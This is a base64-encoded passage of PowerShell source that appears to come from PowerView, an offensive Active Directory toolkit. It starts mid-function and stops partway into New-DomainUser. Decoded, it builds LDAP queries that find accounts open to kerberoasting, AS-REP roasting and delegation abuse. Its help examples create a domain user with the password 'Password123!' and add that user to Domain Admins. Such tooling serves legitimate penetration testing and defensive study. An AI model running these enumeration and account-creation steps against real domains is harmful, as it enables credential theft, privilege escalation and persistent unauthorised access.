JFNlY3VyaXR5TWFza3MsCgogICAgICAgIFtTd2l0Y2hdCiAgICAgICAgJFRvbWJzdG9uZSwKCiAgICAgICAgW0FsaWFzKCdSZXR1cm5PbmUnKV0KICAgICAgICBbU3dpdGNoXQogICAgICAgICRGaW5kT25lLAoKICAgICAgICBbTWFuYWdlbWVudC5BdXRvbWF0aW9uLlBTQ3JlZGVudGlhbF0KICAgICAgICBbTWFuYWdlbWVudC5BdXRvbWF0aW9uLkNyZWRlbnRpYWxBdHRyaWJ1dGUoKV0KICAgICAgICAkQ3JlZGVudGlhbCA9IFtNYW5hZ2VtZW50LkF1dG9tYXRpb24uUFNDcmVkZW50aWFsXTo6RW1wdHksCgogICAgICAgIFtTd2l0Y2hdCiAgICAgICAgJFJhdwogICAgKQoKICAgIER5bmFtaWNQYXJhbSB7CiAgICAgICAgJFVBQ1ZhbHVlTmFtZXMgPSBbRW51bV06OkdldE5hbWVzKCRVQUNFbnVtKQogICAgICAgICMgYWRkIGluIHRoZSBuZWdhdGlvbnMKICAgICAgICAkVUFDVmFsdWVOYW1lcyA9ICRVQUNWYWx1ZU5hbWVzIHwgRm9yRWFjaC1PYmplY3QgeyRfOyAiTk9UXyRfIn0KICAgICAgICAjIGNyZWF0ZSBuZXcgZHluYW1pYyBwYXJhbWV0ZXIKICAgICAgICBOZXctRHluYW1pY1BhcmFtZXRlciAtTmFtZSBVQUNGaWx0ZXIgLVZhbGlkYXRlU2V0ICRVQUNWYWx1ZU5hbWVzIC1UeXBlIChbYXJyYXldKQogICAgfQoKICAgIEJFR0lOIHsKICAgICAgICAkU2VhcmNoZXJBcmd1bWVudHMgPSBAe30KICAgICAgICBpZiAoJFBTQm91bmRQYXJhbWV0ZXJzWydEb21haW4nXSkgeyAkU2VhcmNoZXJBcmd1bWVudHNbJ0RvbWFpbiddID0gJERvbWFpbiB9CiAgICAgICAgaWYgKCRQU0JvdW5kUGFyYW1ldGVyc1snUHJvcGVydGllcyddKSB7ICRTZWFyY2hlckFyZ3VtZW50c1snUHJvcGVydGllcyddID0gJFByb3BlcnRpZXMgfQogICAgICAgIGlmICgkUFNCb3VuZFBhcmFtZXRlcnNbJ1NlYXJjaEJhc2UnXSkgeyAkU2VhcmNoZXJBcmd1bWVudHNbJ1NlYXJjaEJhc2UnXSA9ICRTZWFyY2hCYXNlIH0KICAgICAgICBpZiAoJFBTQm91bmRQYXJhbWV0ZXJzWydTZXJ2ZXInXSkgeyAkU2VhcmNoZXJBcmd1bWVudHNbJ1NlcnZlciddID0gJFNlcnZlciB9CiAgICAgICAgaWYgKCRQU0JvdW5kUGFyYW1ldGVyc1snU2VhcmNoU2NvcGUnXSkgeyAkU2VhcmNoZXJBcmd1bWVudHNbJ1NlYXJjaFNjb3BlJ10gPSAkU2VhcmNoU2NvcGUgfQogICAgICAgIGlmICgkUFNCb3VuZFBhcmFtZXRlcnNbJ1Jlc3VsdFBhZ2VTaXplJ10pIHsgJFNlYXJjaGVyQXJndW1lbnRzWydSZXN1bHRQYWdlU2l6ZSddID0gJFJlc3VsdFBhZ2VTaXplIH0KICAgICAgICBpZiAoJFBTQm91bmRQYXJhbWV0ZXJzWydTZXJ2ZXJUaW1lTGltaXQnXSkgeyAkU2VhcmNoZXJBcmd1bWVudHNbJ1NlcnZlclRpbWVMaW1pdCddID0gJFNlcnZlclRpbWVMaW1pdCB9CiAgICAgICAgaWYgKCRQU0JvdW5kUGFyYW1ldGVyc1snU2VjdXJpdHlNYXNrcyddKSB7ICRTZWFyY2hlckFyZ3VtZW50c1snU2VjdXJpdHlNYXNrcyddID0gJFNlY3VyaXR5TWFza3MgfQogICAgICAgIGlmICgkUFNCb3VuZFBhcmFtZXRlcnNbJ1RvbWJzdG9uZSddKSB7ICRTZWFyY2hlckFyZ3VtZW50c1snVG9tYnN0b25lJ10gPSAkVG9tYnN0b25lIH0KICAgICAgICBpZiAoJFBTQm91bmRQYXJhbWV0ZXJzWydDcmVkZW50aWFsJ10pIHsgJFNlYXJjaGVyQXJndW1lbnRzWydDcmVkZW50aWFsJ10gPSAkQ3JlZGVudGlhbCB9CiAgICAgICAgJFVzZXJTZWFyY2hlciA9IEdldC1Eb21haW5TZWFyY2hlciBAU2VhcmNoZXJBcmd1bWVudHMKICAgIH0KCiAgICBQUk9DRVNTIHsKICAgICAgICAjYmluZCBkeW5hbWljIHBhcmFtZXRlciB0byBhIGZyaWVuZGx5IHZhcmlhYmxlCiAgICAgICAgaWYgKCRQU0JvdW5kUGFyYW1ldGVycyAtYW5kICgkUFNCb3VuZFBhcmFtZXRlcnMuQ291bnQgLW5lIDApKSB7CiAgICAgICAgICAgIE5ldy1EeW5hbWljUGFyYW1ldGVyIC1DcmVhdGVWYXJpYWJsZXMgLUJvdW5kUGFyYW1ldGVycyAkUFNCb3VuZFBhcmFtZXRlcnMKICAgICAgICB9CgogICAgICAgIGlmICgkVXNlclNlYXJjaGVyKSB7CiAgICAgICAgICAgICRJZGVudGl0eUZpbHRlciA9ICcnCiAgICAgICAgICAgICRGaWx0ZXIgPSAnJwogICAgICAgICAgICAkSWRlbnRpdHkgfCBXaGVyZS1PYmplY3QgeyRffSB8IEZvckVhY2gtT2JqZWN0IHsKICAgICAgICAgICAgICAgICRJZGVudGl0eUluc3RhbmNlID0gJF8uUmVwbGFjZSgnKCcsICdcMjgnKS5SZXBsYWNlKCcpJywgJ1wyOScpCiAgICAgICAgICAgICAgICBpZiAoJElkZW50aXR5SW5zdGFuY2UgLW1hdGNoICdeUy0xLScpIHsKICAgICAgICAgICAgICAgICAgICAkSWRlbnRpdHlGaWx0ZXIgKz0gIihvYmplY3RzaWQ9JElkZW50aXR5SW5zdGFuY2UpIgogICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgZWxzZWlmICgkSWRlbnRpdHlJbnN0YW5jZSAtbWF0Y2ggJ15DTj0nKSB7CiAgICAgICAgICAgICAgICAgICAgJElkZW50aXR5RmlsdGVyICs9ICIoZGlzdGluZ3Vpc2hlZG5hbWU9JElkZW50aXR5SW5zdGFuY2UpIgogICAgICAgICAgICAgICAgICAgIGlmICgoLW5vdCAkUFNCb3VuZFBhcmFtZXRlcnNbJ0RvbWFpbiddKSAtYW5kICgtbm90ICRQU0JvdW5kUGFyYW1ldGVyc1snU2VhcmNoQmFzZSddKSkgewogICAgICAgICAgICAgICAgICAgICAgICAjIGlmIGEgLURvbWFpbiBpc24ndCBleHBsaWNpdGx5IHNldCwgZXh0cmFjdCB0aGUgb2JqZWN0IGRvbWFpbiBvdXQgb2YgdGhlIGRpc3Rpbmd1aXNoZWRuYW1lCiAgICAgICAgICAgICAgICAgICAgICAgICMgICBhbmQgcmVidWlsZCB0aGUgZG9tYWluIHNlYXJjaGVyCiAgICAgICAgICAgICAgICAgICAgICAgICRJZGVudGl0eURvbWFpbiA9ICRJZGVudGl0eUluc3RhbmNlLlN1YlN0cmluZygkSWRlbnRpdHlJbnN0YW5jZS5JbmRleE9mKCdEQz0nKSkgLXJlcGxhY2UgJ0RDPScsJycgLXJlcGxhY2UgJywnLCcuJwogICAgICAgICAgICAgICAgICAgICAgICBXcml0ZS1WZXJib3NlICJbR2V0LURvbWFpblVzZXJdIEV4dHJhY3RlZCBkb21haW4gJyRJZGVudGl0eURvbWFpbicgZnJvbSAnJElkZW50aXR5SW5zdGFuY2UnIgogICAgICAgICAgICAgICAgICAgICAgICAkU2VhcmNoZXJBcmd1bWVudHNbJ0RvbWFpbiddID0gJElkZW50aXR5RG9tYWluCiAgICAgICAgICAgICAgICAgICAgICAgICRVc2VyU2VhcmNoZXIgPSBHZXQtRG9tYWluU2VhcmNoZXIgQFNlYXJjaGVyQXJndW1lbnRzCiAgICAgICAgICAgICAgICAgICAgICAgIGlmICgtbm90ICRVc2VyU2VhcmNoZXIpIHsKICAgICAgICAgICAgICAgICAgICAgICAgICAgIFdyaXRlLVdhcm5pbmcgIltHZXQtRG9tYWluVXNlcl0gVW5hYmxlIHRvIHJldHJpZXZlIGRvbWFpbiBzZWFyY2hlciBmb3IgJyRJZGVudGl0eURvbWFpbiciCiAgICAgICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICBlbHNlaWYgKCRJZGVudGl0eUluc3RhbmNlIC1pbWF0Y2ggJ15bMC05QS1GXXs4fS0oWzAtOUEtRl17NH0tKXszfVswLTlBLUZdezEyfSQnKSB7CiAgICAgICAgICAgICAgICAgICAgJEd1aWRCeXRlU3RyaW5nID0gKChbR3VpZF0kSWRlbnRpdHlJbnN0YW5jZSkuVG9CeXRlQXJyYXkoKSB8IEZvckVhY2gtT2JqZWN0IHsgJ1wnICsgJF8uVG9TdHJpbmcoJ1gyJykgfSkgLWpvaW4gJycKICAgICAgICAgICAgICAgICAgICAkSWRlbnRpdHlGaWx0ZXIgKz0gIihvYmplY3RndWlkPSRHdWlkQnl0ZVN0cmluZykiCiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICBlbHNlaWYgKCRJZGVudGl0eUluc3RhbmNlLkNvbnRhaW5zKCdcJykpIHsKICAgICAgICAgICAgICAgICAgICAkQ29udmVydGVkSWRlbnRpdHlJbnN0YW5jZSA9ICRJZGVudGl0eUluc3RhbmNlLlJlcGxhY2UoJ1wyOCcsICcoJykuUmVwbGFjZSgnXDI5JywgJyknKSB8IENvbnZlcnQtQUROYW1lIC1PdXRwdXRUeXBlIENhbm9uaWNhbAogICAgICAgICAgICAgICAgICAgIGlmICgkQ29udmVydGVkSWRlbnRpdHlJbnN0YW5jZSkgewogICAgICAgICAgICAgICAgICAgICAgICAkVXNlckRvbWFpbiA9ICRDb252ZXJ0ZWRJZGVudGl0eUluc3RhbmNlLlN1YlN0cmluZygwLCAkQ29udmVydGVkSWRlbnRpdHlJbnN0YW5jZS5JbmRleE9mKCcvJykpCiAgICAgICAgICAgICAgICAgICAgICAgICRVc2VyTmFtZSA9ICRJZGVudGl0eUluc3RhbmNlLlNwbGl0KCdcJylbMV0KICAgICAgICAgICAgICAgICAgICAgICAgJElkZW50aXR5RmlsdGVyICs9ICIoc2FtQWNjb3VudE5hbWU9JFVzZXJOYW1lKSIKICAgICAgICAgICAgICAgICAgICAgICAgJFNlYXJjaGVyQXJndW1lbnRzWydEb21haW4nXSA9ICRVc2VyRG9tYWluCiAgICAgICAgICAgICAgICAgICAgICAgIFdyaXRlLVZlcmJvc2UgIltHZXQtRG9tYWluVXNlcl0gRXh0cmFjdGVkIGRvbWFpbiAnJFVzZXJEb21haW4nIGZyb20gJyRJZGVudGl0eUluc3RhbmNlJyIKICAgICAgICAgICAgICAgICAgICAgICAgJFVzZXJTZWFyY2hlciA9IEdldC1Eb21haW5TZWFyY2hlciBAU2VhcmNoZXJBcmd1bWVudHMKICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICBlbHNlIHsKICAgICAgICAgICAgICAgICAgICAkSWRlbnRpdHlGaWx0ZXIgKz0gIihzYW1BY2NvdW50TmFtZT0kSWRlbnRpdHlJbnN0YW5jZSkiCiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgIH0KCiAgICAgICAgICAgIGlmICgkSWRlbnRpdHlGaWx0ZXIgLWFuZCAoJElkZW50aXR5RmlsdGVyLlRyaW0oKSAtbmUgJycpICkgewogICAgICAgICAgICAgICAgJEZpbHRlciArPSAiKHwkSWRlbnRpdHlGaWx0ZXIpIgogICAgICAgICAgICB9CgogICAgICAgICAgICBpZiAoJFBTQm91bmRQYXJhbWV0ZXJzWydTUE4nXSkgewogICAgICAgICAgICAgICAgV3JpdGUtVmVyYm9zZSAnW0dldC1Eb21haW5Vc2VyXSBTZWFyY2hpbmcgZm9yIG5vbi1udWxsIHNlcnZpY2UgcHJpbmNpcGFsIG5hbWVzJwogICAgICAgICAgICAgICAgJEZpbHRlciArPSAnKHNlcnZpY2VQcmluY2lwYWxOYW1lPSopJwogICAgICAgICAgICB9CiAgICAgICAgICAgIGlmICgkUFNCb3VuZFBhcmFtZXRlcnNbJ0FsbG93RGVsZWdhdGlvbiddKSB7CiAgICAgICAgICAgICAgICBXcml0ZS1WZXJib3NlICdbR2V0LURvbWFpblVzZXJdIFNlYXJjaGluZyBmb3IgdXNlcnMgd2hvIGNhbiBiZSBkZWxlZ2F0ZWQnCiAgICAgICAgICAgICAgICAjIG5lZ2F0aW9uIG9mICJBY2NvdW50cyB0aGF0IGFyZSBzZW5zaXRpdmUgYW5kIG5vdCB0cnVzdGVkIGZvciBkZWxlZ2F0aW9uIgogICAgICAgICAgICAgICAgJEZpbHRlciArPSAnKCEodXNlckFjY291bnRDb250cm9sOjEuMi44NDAuMTEzNTU2LjEuNC44MDM6PTEwNDg1NzQpKScKICAgICAgICAgICAgfQogICAgICAgICAgICBpZiAoJFBTQm91bmRQYXJhbWV0ZXJzWydEaXNhbGxvd0RlbGVnYXRpb24nXSkgewogICAgICAgICAgICAgICAgV3JpdGUtVmVyYm9zZSAnW0dldC1Eb21haW5Vc2VyXSBTZWFyY2hpbmcgZm9yIHVzZXJzIHdobyBhcmUgc2Vuc2l0aXZlIGFuZCBub3QgdHJ1c3RlZCBmb3IgZGVsZWdhdGlvbicKICAgICAgICAgICAgICAgICRGaWx0ZXIgKz0gJyh1c2VyQWNjb3VudENvbnRyb2w6MS4yLjg0MC4xMTM1NTYuMS40LjgwMzo9MTA0ODU3NCknCiAgICAgICAgICAgIH0KICAgICAgICAgICAgaWYgKCRQU0JvdW5kUGFyYW1ldGVyc1snQWRtaW5Db3VudCddKSB7CiAgICAgICAgICAgICAgICBXcml0ZS1WZXJib3NlICdbR2V0LURvbWFpblVzZXJdIFNlYXJjaGluZyBmb3IgYWRtaW5Db3VudD0xJwogICAgICAgICAgICAgICAgJEZpbHRlciArPSAnKGFkbWluY291bnQ9MSknCiAgICAgICAgICAgIH0KICAgICAgICAgICAgaWYgKCRQU0JvdW5kUGFyYW1ldGVyc1snVHJ1c3RlZFRvQXV0aCddKSB7CiAgICAgICAgICAgICAgICBXcml0ZS1WZXJib3NlICdbR2V0LURvbWFpblVzZXJdIFNlYXJjaGluZyBmb3IgdXNlcnMgdGhhdCBhcmUgdHJ1c3RlZCB0byBhdXRoZW50aWNhdGUgZm9yIG90aGVyIHByaW5jaXBhbHMnCiAgICAgICAgICAgICAgICAkRmlsdGVyICs9ICcobXNkcy1hbGxvd2VkdG9kZWxlZ2F0ZXRvPSopJwogICAgICAgICAgICB9CiAgICAgICAgICAgIGlmICgkUFNCb3VuZFBhcmFtZXRlcnNbJ1ByZWF1dGhOb3RSZXF1aXJlZCddKSB7CiAgICAgICAgICAgICAgICBXcml0ZS1WZXJib3NlICdbR2V0LURvbWFpblVzZXJdIFNlYXJjaGluZyBmb3IgdXNlciBhY2NvdW50cyB0aGF0IGRvIG5vdCByZXF1aXJlIGtlcmJlcm9zIHByZWF1dGhlbnRpY2F0ZScKICAgICAgICAgICAgICAgICRGaWx0ZXIgKz0gJyh1c2VyQWNjb3VudENvbnRyb2w6MS4yLjg0MC4xMTM1NTYuMS40LjgwMzo9NDE5NDMwNCknCiAgICAgICAgICAgIH0KICAgICAgICAgICAgaWYgKCRQU0JvdW5kUGFyYW1ldGVyc1snTERBUEZpbHRlciddKSB7CiAgICAgICAgICAgICAgICBXcml0ZS1WZXJib3NlICJbR2V0LURvbWFpblVzZXJdIFVzaW5nIGFkZGl0aW9uYWwgTERBUCBmaWx0ZXI6ICRMREFQRmlsdGVyIgogICAgICAgICAgICAgICAgJEZpbHRlciArPSAiJExEQVBGaWx0ZXIiCiAgICAgICAgICAgIH0KCiAgICAgICAgICAgICMgYnVpbGQgdGhlIExEQVAgZmlsdGVyIGZvciB0aGUgZHluYW1pYyBVQUMgZmlsdGVyIHZhbHVlCiAgICAgICAgICAgICRVQUNGaWx0ZXIgfCBXaGVyZS1PYmplY3QgeyRffSB8IEZvckVhY2gtT2JqZWN0IHsKICAgICAgICAgICAgICAgIGlmICgkXyAtbWF0Y2ggJ05PVF8uKicpIHsKICAgICAgICAgICAgICAgICAgICAkVUFDRmllbGQgPSAkXy5TdWJzdHJpbmcoNCkKICAgICAgICAgICAgICAgICAgICAkVUFDVmFsdWUgPSBbSW50XSgkVUFDRW51bTo6JFVBQ0ZpZWxkKQogICAgICAgICAgICAgICAgICAgICRGaWx0ZXIgKz0gIighKHVzZXJBY2NvdW50Q29udHJvbDoxLjIuODQwLjExMzU1Ni4xLjQuODAzOj0kVUFDVmFsdWUpKSIKICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgIGVsc2UgewogICAgICAgICAgICAgICAgICAgICRVQUNWYWx1ZSA9IFtJbnRdKCRVQUNFbnVtOjokXykKICAgICAgICAgICAgICAgICAgICAkRmlsdGVyICs9ICIodXNlckFjY291bnRDb250cm9sOjEuMi44NDAuMTEzNTU2LjEuNC44MDM6PSRVQUNWYWx1ZSkiCiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgIH0KCiAgICAgICAgICAgICRVc2VyU2VhcmNoZXIuZmlsdGVyID0gIigmKHNhbUFjY291bnRUeXBlPTgwNTMwNjM2OCkkRmlsdGVyKSIKICAgICAgICAgICAgV3JpdGUtVmVyYm9zZSAiW0dldC1Eb21haW5Vc2VyXSBmaWx0ZXIgc3RyaW5nOiAkKCRVc2VyU2VhcmNoZXIuZmlsdGVyKSIKCiAgICAgICAgICAgIGlmICgkUFNCb3VuZFBhcmFtZXRlcnNbJ0ZpbmRPbmUnXSkgeyAkUmVzdWx0cyA9ICRVc2VyU2VhcmNoZXIuRmluZE9uZSgpIH0KICAgICAgICAgICAgZWxzZSB7ICRSZXN1bHRzID0gJFVzZXJTZWFyY2hlci5GaW5kQWxsKCkgfQogICAgICAgICAgICAkUmVzdWx0cyB8IFdoZXJlLU9iamVjdCB7JF99IHwgRm9yRWFjaC1PYmplY3QgewogICAgICAgICAgICAgICAgaWYgKCRQU0JvdW5kUGFyYW1ldGVyc1snUmF3J10pIHsKICAgICAgICAgICAgICAgICAgICAjIHJldHVybiByYXcgcmVzdWx0IG9iamVjdHMKICAgICAgICAgICAgICAgICAgICAkVXNlciA9ICRfCiAgICAgICAgICAgICAgICAgICAgJFVzZXIuUFNPYmplY3QuVHlwZU5hbWVzLkluc2VydCgwLCAnUG93ZXJWaWV3LlVzZXIuUmF3JykKICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgIGVsc2UgewogICAgICAgICAgICAgICAgICAgICRVc2VyID0gQ29udmVydC1MREFQUHJvcGVydHkgLVByb3BlcnRpZXMgJF8uUHJvcGVydGllcwogICAgICAgICAgICAgICAgICAgICRVc2VyLlBTT2JqZWN0LlR5cGVOYW1lcy5JbnNlcnQoMCwgJ1Bvd2VyVmlldy5Vc2VyJykKICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICRVc2VyCiAgICAgICAgICAgIH0KICAgICAgICAgICAgaWYgKCRSZXN1bHRzKSB7CiAgICAgICAgICAgICAgICB0cnkgeyAkUmVzdWx0cy5kaXNwb3NlKCkgfQogICAgICAgICAgICAgICAgY2F0Y2ggewogICAgICAgICAgICAgICAgICAgIFdyaXRlLVZlcmJvc2UgIltHZXQtRG9tYWluVXNlcl0gRXJyb3IgZGlzcG9zaW5nIG9mIHRoZSBSZXN1bHRzIG9iamVjdDogJF8iCiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgIH0KICAgICAgICAgICAgJFVzZXJTZWFyY2hlci5kaXNwb3NlKCkKICAgICAgICB9CiAgICB9Cn0KCgpmdW5jdGlvbiBOZXctRG9tYWluVXNlciB7CjwjCi5TWU5PUFNJUwoKQ3JlYXRlcyBhIG5ldyBkb21haW4gdXNlciAoYXNzdW1pbmcgYXBwcm9wcmlhdGUgcGVybWlzc2lvbnMpIGFuZCByZXR1cm5zIHRoZSB1c2VyIG9iamVjdC4KClRPRE86IGltcGxlbWVudCBhbGwgcHJvcGVydGllcyB0aGF0IE5ldy1BRFVzZXIgaW1wbGVtZW50cyAoaHR0cHM6Ly90ZWNobmV0Lm1pY3Jvc29mdC5jb20vZW4tdXMvbGlicmFyeS9lZTYxNzI1My5hc3B4KS4KCkF1dGhvcjogV2lsbCBTY2hyb2VkZXIgKEBoYXJtajB5KSAgCkxpY2Vuc2U6IEJTRCAzLUNsYXVzZSAgClJlcXVpcmVkIERlcGVuZGVuY2llczogR2V0LVByaW5jaXBhbENvbnRleHQgIAoKLkRFU0NSSVBUSU9OCgpGaXJzdCBiaW5kcyB0byB0aGUgc3BlY2lmaWVkIGRvbWFpbiBjb250ZXh0IHVzaW5nIEdldC1QcmluY2lwYWxDb250ZXh0LgpUaGUgYm91bmQgZG9tYWluIGNvbnRleHQgaXMgdGhlbiB1c2VkIHRvIGNyZWF0ZSBhIG5ldwpEaXJlY3RvcnlTZXJ2aWNlcy5BY2NvdW50TWFuYWdlbWVudC5Vc2VyUHJpbmNpcGFsIHdpdGggdGhlIHNwZWNpZmllZCB1c2VyIHByb3BlcnRpZXMuCgouUEFSQU1FVEVSIFNhbUFjY291bnROYW1lCgpTcGVjaWZpZXMgdGhlIFNlY3VyaXR5IEFjY291bnQgTWFuYWdlciAoU0FNKSBhY2NvdW50IG5hbWUgb2YgdGhlIHVzZXIgdG8gY3JlYXRlLgpNYXhpbXVtIG9mIDI1NiBjaGFyYWN0ZXJzLiBNYW5kYXRvcnkuCgouUEFSQU1FVEVSIEFjY291bnRQYXNzd29yZAoKU3BlY2lmaWVzIHRoZSBwYXNzd29yZCBmb3IgdGhlIGNyZWF0ZWQgdXNlci4gTWFuZGF0b3J5LgoKLlBBUkFNRVRFUiBOYW1lCgpTcGVjaWZpZXMgdGhlIG5hbWUgb2YgdGhlIHVzZXIgdG8gY3JlYXRlLiBJZiBub3QgcHJvdmlkZWQsIGRlZmF1bHRzIHRvIFNhbUFjY291bnROYW1lLgoKLlBBUkFNRVRFUiBEaXNwbGF5TmFtZQoKU3BlY2lmaWVzIHRoZSBkaXNwbGF5IG5hbWUgb2YgdGhlIHVzZXIgdG8gY3JlYXRlLiBJZiBub3QgcHJvdmlkZWQsIGRlZmF1bHRzIHRvIFNhbUFjY291bnROYW1lLgoKLlBBUkFNRVRFUiBEZXNjcmlwdGlvbgoKU3BlY2lmaWVzIHRoZSBkZXNjcmlwdGlvbiBvZiB0aGUgdXNlciB0byBjcmVhdGUuCgouUEFSQU1FVEVSIERvbWFpbgoKU3BlY2lmaWVzIHRoZSBkb21haW4gdG8gdXNlIHRvIHNlYXJjaCBmb3IgdXNlci9ncm91cCBwcmluY2lwYWxzLCBkZWZhdWx0cyB0byB0aGUgY3VycmVudCBkb21haW4uCgouUEFSQU1FVEVSIENyZWRlbnRpYWwKCkEgW01hbmFnZW1lbnQuQXV0b21hdGlvbi5QU0NyZWRlbnRpYWxdIG9iamVjdCBvZiBhbHRlcm5hdGUgY3JlZGVudGlhbHMKZm9yIGNvbm5lY3Rpb24gdG8gdGhlIHRhcmdldCBkb21haW4uCgouRVhBTVBMRQoKJFVzZXJQYXNzd29yZCA9IENvbnZlcnRUby1TZWN1cmVTdHJpbmcgJ1Bhc3N3b3JkMTIzIScgLUFzUGxhaW5UZXh0IC1Gb3JjZQpOZXctRG9tYWluVXNlciAtU2FtQWNjb3VudE5hbWUgaGFybWoweTIgLURlc2NyaXB0aW9uICdUaGlzIGlzIGhhcm1qMHknIC1BY2NvdW50UGFzc3dvcmQgJFVzZXJQYXNzd29yZAoKQ3JlYXRlcyB0aGUgJ2hhcm1qMHkyJyB1c2VyIHdpdGggdGhlIHNwZWNpZmllZCBkZXNjcmlwdGlvbiBhbmQgcGFzc3dvcmQuCgouRVhBTVBMRQoKJFNlY1Bhc3N3b3JkID0gQ29udmVydFRvLVNlY3VyZVN0cmluZyAnUGFzc3dvcmQxMjMhJyAtQXNQbGFpblRleHQgLUZvcmNlCiRDcmVkID0gTmV3LU9iamVjdCBTeXN0ZW0uTWFuYWdlbWVudC5BdXRvbWF0aW9uLlBTQ3JlZGVudGlhbCgnVEVTVExBQlxkZm0uYScsICRTZWNQYXNzd29yZCkKJFVzZXJQYXNzd29yZCA9IENvbnZlcnRUby1TZWN1cmVTdHJpbmcgJ1Bhc3N3b3JkMTIzIScgLUFzUGxhaW5UZXh0IC1Gb3JjZQokdXNlciA9IE5ldy1Eb21haW5Vc2VyIC1TYW1BY2NvdW50TmFtZSBoYXJtajB5MiAtRGVzY3JpcHRpb24gJ1RoaXMgaXMgaGFybWoweScgLUFjY291bnRQYXNzd29yZCAkVXNlclBhc3N3b3JkIC1DcmVkZW50aWFsICRDcmVkCgpDcmVhdGVzIHRoZSAnaGFybWoweTInIHVzZXIgd2l0aCB0aGUgc3BlY2lmaWVkIGRlc2NyaXB0aW9uIGFuZCBwYXNzd29yZCwgdXNpbmcgdGhlIHNwZWNpZmllZAphbHRlcm5hdGUgY3JlZGVudGlhbHMuCgouRVhBTVBMRQoKJFNlY1Bhc3N3b3JkID0gQ29udmVydFRvLVNlY3VyZVN0cmluZyAnUGFzc3dvcmQxMjMhJyAtQXNQbGFpblRleHQgLUZvcmNlCiRDcmVkID0gTmV3LU9iamVjdCBTeXN0ZW0uTWFuYWdlbWVudC5BdXRvbWF0aW9uLlBTQ3JlZGVudGlhbCgnVEVTVExBQlxkZm0uYScsICRTZWNQYXNzd29yZCkKJFVzZXJQYXNzd29yZCA9IENvbnZlcnRUby1TZWN1cmVTdHJpbmcgJ1Bhc3N3b3JkMTIzIScgLUFzUGxhaW5UZXh0IC1Gb3JjZQpOZXctRG9tYWluVXNlciAtU2FtQWNjb3VudE5hbWUgYW5keSAtQWNjb3VudFBhc3N3b3JkICRVc2VyUGFzc3dvcmQgLUNyZWRlbnRpYWwgJENyZWQgfCBBZGQtRG9tYWluR3JvdXBNZW1iZXIgJ0RvbWFpbiBBZG1pbnMnIC1DcmVkZW50aWFsICRDcmVkCgpDcmVhdGVzIHRoZSAnYW5keScgdXNlciB3aXRoIHRoZSBzcGVjaWZpZWQgZGVzY3JpcHRpb24gYW5kIHBhc3N3b3JkLCB1c2luZyB0aGUgc3BlY2lmaWVkCmFsdGVybmF0ZSBjcmVkZW50aWFscywgYW5kIGFkZHMgdGhlIHVzZXIgdG8gJ2RvbWFpbiBhZG1pbnMnIHVzaW5nIEFkZC1Eb21haW5Hcm91cE1lbWJlcgphbmQgdGhlIGFsdGVybmF0ZSBjcmVkZW50aWFscy4KCi5PVVRQVVRTCgpEaXJlY3RvcnlTZXJ2aWNlcy5BY2NvdW50TWFuYWdlbWVudC5Vc2VyUHJpbmNpcGFsCgouTElOSwoKaHR0cDovL3JpY2hhcmRzcG93ZXJzaGVsbGJsb2cud29yZHByZXNzLmNvbS8yMDA4LzA1LzI1L3N5c3RlbS1kaXJlY3RvcnlzZXJ2aWNlcy1hY2NvdW50bWFuYWdlbWVudC8KIz4KCiAgICBbRGlhZ25vc3RpY3MuQ29kZUFuYWx5c2lzLlN1cHByZXNzTWVzc2FnZUF0dHJpYnV0ZSgnUFNVc2VTaG91bGRQcm9jZXNzRm9yU3RhdGVDaGFuZ2luZ0Z1bmN0aW9ucycsICcnKV0KICAgIFtEaWFnbm9zdGljcy5Db2RlQW5hbHlzaXMuU3VwcHJlc3NNZXNzYWdlQXR0cmlidXRlKCdQU1Nob3VsZFByb2Nlc3MnLCAnJyldCiAgICBbT3V0cHV0VHlwZSgnRGlyZWN0b3J5U2VydmljZXMuQWNjb3VudE1hbmFnZW1lbnQuVXNlclByaW5jaXBhbCcpXQogICAgUGFyYW0oCiAgICAgICAgW1BhcmFtZXRlcihNYW5kYXRvcnkgPSAkVHJ1ZSldCiAgICAgICAgW1ZhbGlkYXRlTGVuZ3RoKDAsIDI1NildCiAgICAgICAgW1N0cmluZ10KICAgICAgICAkU2FtQWNjb3VudE5hbWUsCgogICAgICAgIFtQYXJhbWV0ZXIoTWFuZGF0b3J5ID0gJFRydWUpXQogICAgICAgIFtWYWxpZGF0ZU5vdE51bGxPckVtcHR5KCldCiAgICAgICAgW0FsaWFzKCdQYXNzd29yZCcpXQogICAgICAgIFtTZWN1cml0eS5TZWN1cmVTdHJpbmddCiAgICAgICAgJEFjY291bnRQYXNzd29yZCwKCiAgICAgICAgW1ZhbGlkYXRlTm90TnVsbE9yRW1wdHkoKV0KICAgICAgICBbU3RyaW5nXQogICAgICAgICROYW1lLAoKICAgICAgICBbVmFsaWRhdGVOb3ROdWxsT3JFbXB0eSgpXQogICAgICAgIFtTdHJpbmddCiAgICAgICAgJERpc3BsYXlOYW1lLAoKICAgICAgICBbVmFsaWRhdGVOb3ROdWxsT3JFbXB0eSgpXQogICAgICAgIFtTdHJpbmddCiAgICAgICAgJERlc2NyaXB0aW9uLAoKICAgICAgICBbVmFsaWRhdGVOb3ROdWxsT3JFbXB0eSgpXQogICAgICAgIFtTdHJpbmddCiAgICAgICAgJERvbWFpbiwKCiAgICAgICAgW01hbmFnZW1lbnQuQXV0b21hdGlvbi5QU0NyZWRlbnRpYWxdCiAgICAgICAgW01hbmFnZW1lbnQuQXV0b21hdGlvbi5DcmVkZW50aWFsQXR0cmlidXRlKCldCiAgICAgICAgJENyZWRlbnRpYWwgPSBbTWFuYWdlbWVudC5BdXRvbWF0aW9uLlBTQ3JlZGVudGlhbF06OkVtcHR5CiAgICApCgogICAgJENvbnRleHRBcmd1bWVudHMgPSBAewogICAgICAgICdJZGVudGl0eScgPSAkU2FtQWNjb3VudE5hbWUKICAgIH0KICAgIGlmICgkUFNCb3VuZFBhcmFtZXRlcnNbJ0RvbWFpbiddKSB7ICRDb250ZXh0QXJndW1lbnRzWydEb21haW4nXSA9ICREb21haW4gfQog